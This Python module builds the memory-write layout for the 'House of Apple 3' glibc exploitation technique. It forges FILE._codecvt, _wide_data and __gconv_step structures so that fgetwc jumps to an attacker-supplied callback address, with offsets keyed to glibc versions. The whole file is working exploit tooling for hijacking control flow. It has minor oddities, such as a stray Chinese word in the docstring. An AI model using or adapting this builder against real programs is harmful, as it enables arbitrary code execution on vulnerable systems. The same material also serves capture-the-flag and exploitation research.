"""House of Apple 3 codecvt sink layout builder for x86-64 glibc."""

from __future__ import annotations

from dataclasses import dataclass


FILE_CODECvt = 0x98
FILE_WIDE_DATA = 0xA0
FILE_FLAGS = 0x00
FILE_READ_BASE = 0x08
FILE_READ_PTR = 0x10
FILE_READ_END = 0x18
FILE_MODE = 0xC0

WIDE_READ_PTR = 0x00
WIDE_READ_END = 0x08
WIDE_READ_BASE = 0x10
WIDE_BUF_BASE = 0x30
WIDE_BUF_END = 0x38

CODEC_LAYOUTS = {
    "2.23": ("legacy", 0x18),
    "2.24": ("legacy", 0x18),
    "2.25": ("legacy", 0x18),
    "2.26": ("legacy", 0x18),
    "2.27": ("legacy", 0x18),
    "2.28": ("legacy", 0x18),
    "2.29": ("legacy", 0x18),
    "2.30": ("transition", 0x28),
}


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _uint(name: str, value: int, bits: int = 64) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= (1 << bits):
        raise ValueError(f"{name} does not fit in {bits} bits")


def _ptr(name: str, value: int) -> bytes:
    _uint(name, value)
    return value.to_bytes(8, "little")


def _write(address: int, data: bytes, label: str) -> MemoryWrite:
    _uint("address", address)
    return MemoryWrite(address, data, label)


def _image(size: int, fields: tuple[tuple[int, bytes], ...]) -> bytes:
    image = bytearray(size)
    for offset, data in fields:
        if offset < 0 or offset + len(data) > size:
            raise ValueError("field falls outside generated object")
        image[offset : offset + len(data)] = data
    return bytes(image)


def _layout(version: str) -> tuple[str, int]:
    if version in CODEC_LAYOUTS:
        return CODEC_LAYOUTS[version]
    if version in {f"2.{minor}" for minor in range(31, 44)}:
        return "modern", 0x28
    raise ValueError("House of Apple 3 supports glibc 2.23 through 2.43")


def build_house_of_apple3(
    version: str,
    *,
    file_addr: int,
    fake_codecvt_addr: int,
    fake_step_addr: int,
    callback_addr: int,
    wide_data_addr: int,
    wide_output_addr: int,
    external_input_addr: int,
    current_flags: int | None = None,
) -> tuple[MemoryWrite, ...]:
    """Build the codecvt callback layout shown by this directory's PoCs.

    The callback is called by ``fgetwc`` after the caller has placed the FILE
    object in wide mode. The returned writes do not perform the FILE投递 or
    trigger; they only describe the fields consumed by the ABI-specific sink.
    """

    layout, callback_offset = _layout(version)
    for name, value in {
        "file_addr": file_addr,
        "fake_codecvt_addr": fake_codecvt_addr,
        "fake_step_addr": fake_step_addr,
        "callback_addr": callback_addr,
        "wide_data_addr": wide_data_addr,
        "wide_output_addr": wide_output_addr,
        "external_input_addr": external_input_addr,
    }.items():
        _uint(name, value)

    writes: list[MemoryWrite] = [
        _write(file_addr + FILE_CODECvt, _ptr("fake_codecvt_addr", fake_codecvt_addr), "FILE._codecvt"),
        _write(file_addr + FILE_WIDE_DATA, _ptr("wide_data_addr", wide_data_addr), "FILE._wide_data"),
        _write(file_addr + FILE_MODE, (1).to_bytes(4, "little"), "FILE._mode"),
        _write(file_addr + FILE_READ_BASE, _ptr("external_input_addr", external_input_addr), "FILE._IO_read_base"),
        _write(file_addr + FILE_READ_PTR, _ptr("external_input_addr", external_input_addr), "FILE._IO_read_ptr"),
        _write(file_addr + FILE_READ_END, _ptr("external_input_end", external_input_addr + 1), "FILE._IO_read_end"),
    ]
    if current_flags is not None:
        _uint("current_flags", current_flags, 32)
        writes.append(_write(file_addr + FILE_FLAGS, (current_flags & ~(0x10 | 0x4)).to_bytes(4, "little"), "FILE._flags"))

    wide = _image(
        0x40,
        (
            (WIDE_READ_PTR, _ptr("wide_output_addr", wide_output_addr)),
            (WIDE_READ_END, _ptr("wide_output_addr", wide_output_addr)),
            (WIDE_READ_BASE, _ptr("wide_output_addr", wide_output_addr)),
            (WIDE_BUF_BASE, _ptr("wide_output_addr", wide_output_addr)),
            (WIDE_BUF_END, _ptr("wide_output_end", wide_output_addr + 0x20)),
        ),
    )
    writes.append(_write(wide_data_addr, wide, "wide_data buffers"))

    if layout == "legacy":
        codecvt = _image(0x20, ((callback_offset, _ptr("callback_addr", callback_addr)),))
    elif layout == "transition":
        codecvt = _image(0x10, ((0x00, (1).to_bytes(8, "little")), (0x08, _ptr("fake_step_addr", fake_step_addr))))
        step = _image(0x30, ((0x00, b"\x00" * 8), (0x28, _ptr("callback_addr", callback_addr))))
        writes.append(_write(fake_step_addr, step, "fake __gconv_step"))
    else:
        codecvt = _image(0x08, ((0x00, _ptr("fake_step_addr", fake_step_addr)),))
        step = _image(0x30, ((0x00, b"\x00" * 8), (0x28, _ptr("callback_addr", callback_addr))))
        writes.append(_write(fake_step_addr, step, "fake __gconv_step"))
    writes.append(_write(fake_codecvt_addr, codecvt, f"fake codecvt ({version})"))
    return tuple(writes)
